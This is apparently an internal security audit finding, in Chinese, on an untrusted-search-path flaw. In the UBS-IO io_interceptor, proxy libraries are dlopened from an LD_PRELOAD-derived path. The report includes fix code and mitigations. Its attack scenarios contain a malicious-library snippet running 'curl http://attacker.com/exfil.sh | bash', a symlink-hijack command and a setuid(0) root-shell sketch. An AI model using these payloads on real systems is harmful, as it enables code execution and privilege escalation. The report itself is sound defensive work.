# VULN-IO-004: 代理库从不可信路径加载致动态库注入任意代码执行

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-IO-004 |
| **CWE** | CWE-426 (Untrusted Search Path) |
| **严重性** | HIGH |
| **置信度** | 85 |
| **模块** | io_interceptor |
| **文件** | `ubsio-boostio/src/io_interceptor/src/proxy_operations_loader.cpp:115-136` |
| **函数** | `LoadProxyDLL` |

## 漏洞描述

代理库 (`libock_*_proxy.so`) 从 `LD_PRELOAD` 环境变量派生的路径加载，使用 `dlopen` 时没有任何签名或完整性验证。攻击者可以：
- **替换代理库**：放置恶意库文件实现任意代码执行
- **路径劫持**：通过符号链接或目录控制劫持加载路径
- **库注入**：利用 LD_PRELOAD 机制注入恶意代码

## 漏洞代码

```cpp
// proxy_operations_loader.cpp:115-136
bool ProxyOperationsLoader::LoadProxyDLL()
{
    for (auto& item : components) {
        std::string proxyName = std::string("/libock_").append(item).append("_proxy.so");
        std::string prefixPath = ldPrePath;  // ← 来自 LD_PRELOAD
        std::string proxyPath = prefixPath.append(proxyName);
        if (!CanonicalPath(proxyPath)) {
            continue;
        }
        handle = dlopen(proxyPath.c_str(), RTLD_NOW);  // ← 无签名验证
        if (handle == nullptr) {
            INTERCEPTORLOG_DEBUG("failed to dlopen %s, error(%s)",
                proxyPath.c_str(), dlerror());
            continue;
        } else {
            workProxy.swap(proxyName);
            return true;
        }
    }
    INTERCEPTORLOG_DEBUG("There is no proxy that working");
    return false;
}
```

**问题分析**：
1. `ldPrePath` 来自环境变量 `LD_PRELOAD`，攻击者可控
2. `CanonicalPath()` 仅做路径规范化，不验证文件所有权/权限
3. `dlopen()` 无签名验证，任何匹配名称的文件都会被加载
4. 加载后立即调用库中的函数（VULN-IO-007）

## 数据流分析

```
┌─────────────────────────────────────────────────────────────────┐
│                        数据流路径                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻击者控制 LD_PRELOAD 环境变量                                  │
│       │                                                         │
│       ▼                                                         │
│  ProxyOperationsLoader::ResolveLdPrePath                        │
│       │                                                         │
│       ▼                                                         │
│  ldPrePath = getenv("LD_PRELOAD")                               │
│       │                                                         │
│       ▼                                                         │
│  LoadProxyDLL                                                   │
│       │                                                         │
│       ▼                                                         │
│  proxyPath = ldPrePath + "/libock_*_proxy.so"                   │
│       │                                                         │
│       ▼                                                         │
│  CanonicalPath(proxyPath) ← 仅路径规范化                        │
│       │                                                         │
│       ▼                                                         │
│  dlopen(proxyPath.c_str(), RTLD_NOW) ← 无签名验证               │
│       │                                                         │
│       ▼                                                         │
│  恶意库代码注入进程                                              │
│       │                                                         │
│       ▼                                                         │
│  LoadProxyOperations → dlsym → getOperationsFuncs               │
│       │                                                         │
│       ▼                                                         │
│  恶意函数指针被调用 → 任意代码执行                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 攻击场景构造

### 场景 1: 恶意库替换攻击

**攻击者**：本地用户或有文件写入能力的攻击者

**步骤**：
1. 创建恶意代理库：
   ```c
   // libock_bio_proxy.so (恶意版本)
   ProxyOperations* getOperationsFuncs(Proxy* proxy) {
       // 在初始化时执行恶意代码
       system("curl http://attacker.com/exfil.sh | bash");
       
       // 返回篡改的操作函数
       static ProxyOperations ops = {
           .open = malicious_open,
           .read = malicious_read,
           // ...
       };
       return &ops;
   }
   ```
2. 设置环境变量：
   ```bash
   export LD_PRELOAD=/path/to/malicious/libs
   ```
3. 启动 UBS-IO 服务
4. 恶意库被加载，攻击代码执行

### 场景 2: 符号链接劫持

**步骤**：
1. 创建指向恶意库的符号链接：
   ```bash
   ln -s /tmp/malicious.so /usr/lib/libock_bio_proxy.so
   ```
2. 服务加载时使用符号链接 → 加载恶意代码

### 场景 3: 权限提升

**条件**：UBS-IO 服务以高权限运行

**步骤**：
1. 通过恶意库获取 root 权限：
   ```c
   // 在 getOperationsFuncs 中执行
   setuid(0);
   setgid(0);
   execve("/bin/bash", ...);
   ```

## 影响范围评估

| 维度 | 评估 |
|------|------|
| **可触发性** | MEDIUM - 需要本地访问或环境变量控制 |
| **攻击者要求** | 本地账户 + 文件写入权限 |
| **影响范围** | HIGH - 整个进程控制 |
| **业务影响** | 服务完全被劫持 |
| **跨模块影响** | YES - 关联 VULN-IO-007 (函数指针) |

**受影响组件**：
- 所有使用 POSIX interceptor 的进程
- IO 加速服务的完整功能

## 修复建议

### 方案 1: 库签名验证 (推荐)

```cpp
// proxy_operations_loader.cpp 修复版本
#include <openssl/evp.h>
#include <openssl/pem.h>

bool ProxyOperationsLoader::VerifyLibrarySignature(const std::string& path)
{
    // 1. 加载预置的公钥
    static EVP_PKEY* pubkey = LoadTrustedPublicKey();
    if (!pubkey) {
        INTERCEPTORLOG_ERROR("Failed to load trusted public key");
        return false;
    }
    
    // 2. 读取库文件
    std::ifstream file(path, std::ios::binary);
    std::vector<uint8_t> libData((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
    
    // 3. 读取签名文件 (path + ".sig")
    std::string sigPath = path + ".sig";
    std::ifstream sigFile(sigPath, std::ios::binary);
    std::vector<uint8_t> signature((std::istreambuf_iterator<char>(sigFile)),
                                    std::istreambuf_iterator<char>());
    
    // 4. 验证签名
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    EVP_DigestVerifyInit(ctx, NULL, EVP_sha256(), NULL, pubkey);
    EVP_DigestVerifyUpdate(ctx, libData.data(), libData.size());
    
    int result = EVP_DigestVerifyFinal(ctx, signature.data(), signature.size());
    EVP_MD_CTX_free(ctx);
    
    return result == 1;
}

bool ProxyOperationsLoader::LoadProxyDLL()
{
    for (auto& item : components) {
        // 使用固定安全路径，不依赖 LD_PRELOAD
        std::string proxyPath = SECURE_PROXY_BASE_DIR + "/" + 
                                std::string("libock_") + item + "_proxy.so";
        
        if (!CanonicalPath(proxyPath)) {
            continue;
        }
        
        // ===== 新增签名验证 =====
        if (!VerifyLibrarySignature(proxyPath)) {
            INTERCEPTORLOG_ERROR("Proxy library signature verification failed: %s",
                                 proxyPath.c_str());
            continue;  // 拒绝加载未签名的库
        }
        
        handle = dlopen(proxyPath.c_str(), RTLD_NOW);
        if (handle == nullptr) {
            INTERCEPTORLOG_DEBUG("failed to dlopen %s, error(%s)",
                proxyPath.c_str(), dlerror());
            continue;
        } else {
            workProxy.swap(proxyPath);
            return true;
        }
    }
    INTERCEPTORLOG_DEBUG("There is no valid proxy that working");
    return false;
}
```

### 方案 2: 固定路径白名单

```cpp
// 使用固定白名单路径，不依赖环境变量
const std::vector<std::string> ALLOWED_PROXY_DIRS = {
    "/usr/lib/ubs-io/proxy",
    "/opt/ubs-io/lib/proxy",
    "/etc/ubs-io/proxy"
};

bool ProxyOperationsLoader::LoadProxyDLL()
{
    for (const auto& dir : ALLOWED_PROXY_DIRS) {
        for (auto& item : components) {
            std::string proxyPath = dir + "/libock_" + item + "_proxy.so";
            
            // 检查路径所有权和权限
            if (!VerifyPathOwnership(proxyPath, "root", 0644)) {
                continue;
            }
            
            handle = dlopen(proxyPath.c_str(), RTLD_NOW);
            // ...
        }
    }
    return false;
}
```

### 方案 3: 完全移除 LD_PRELOAD 依赖

```cpp
// 配置文件控制，而非环境变量
// bio.conf:
// proxy_dir=/usr/lib/ubs-io/proxy

bool ProxyOperationsLoader::LoadProxyDLL()
{
    // 从配置文件读取安全路径
    std::string proxyDir = BioConfig::GetString("proxy_dir", "/usr/lib/ubs-io/proxy");
    
    // 验证配置路径是否在白名单内
    if (!IsInWhitelist(proxyDir)) {
        INTERCEPTORLOG_ERROR("Proxy directory not in whitelist: %s", proxyDir.c_str());
        return false;
    }
    
    // ...
}
```

## 缓解措施

### 立即缓解

1. **环境变量控制**：清除或固定 `LD_PRELOAD`
2. **文件权限**：限制 `/usr/lib` 等目录的写入权限
3. **审计日志**：记录所有 dlopen 操作

### 系统级缓解

1. 使用 SELinux/AppArmor 限制库加载路径
2. 启用 `LD_LIBRARY_PATH` 白名单
3. 使用 `ld.so` 的 `secure-execution` 模式

## 关联漏洞

- **VULN-IO-007**: 不信任函数指针（同一加载流程的下游）
- **CLUSTER-DLOPEN-001**: cluster 模块的类似 dlopen 问题
- **SEC-001**: security 模块的 OpenSSL 库加载问题

## 参考

- CWE-426: https://cwe.mitre.org/data/definitions/426.html
- Linux Dynamic Linking Security: https://man7.org/linux/man-pages/man8/ld.so.8.html
- LD_PRELOAD Attacks: https://www.libexpat.org/2019/03/18/ld-preload-considered-harmful/